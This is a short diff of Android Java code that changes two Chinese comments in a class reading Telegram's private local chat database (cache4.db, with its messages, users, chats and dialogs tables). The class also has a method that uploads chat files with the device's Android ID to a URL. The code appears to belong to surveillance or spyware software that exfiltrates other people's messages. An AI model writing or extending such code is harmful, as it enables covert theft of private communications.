@@ -30,7 +30,7 @@ import static com.hhm.android.otherapp.TelegramManager.localVersionName;
 /**
  * @author huangche
  * @date 2020/11/11
- * Telegram 数据库聊天数据
+ * Telegram 本地数据库数据记录
  * DB_PATH : "/data/data/org.telegram.messenger(Telegram包名)/files/"
  * DB_NAME : "cache4.db"
  * TBL_NAME : messages users chats dialogs
@@ -252,7 +252,7 @@ public class TelegramDb {
         return null;
     }
 
-    // Telegram文件数据结果上报
+    // Telegram 聊天文件 数据结果上报
     public static void T_Sendfile(final Context context, final File file, final int action_id, final String url){
         RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                 .addFormDataPart("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID))
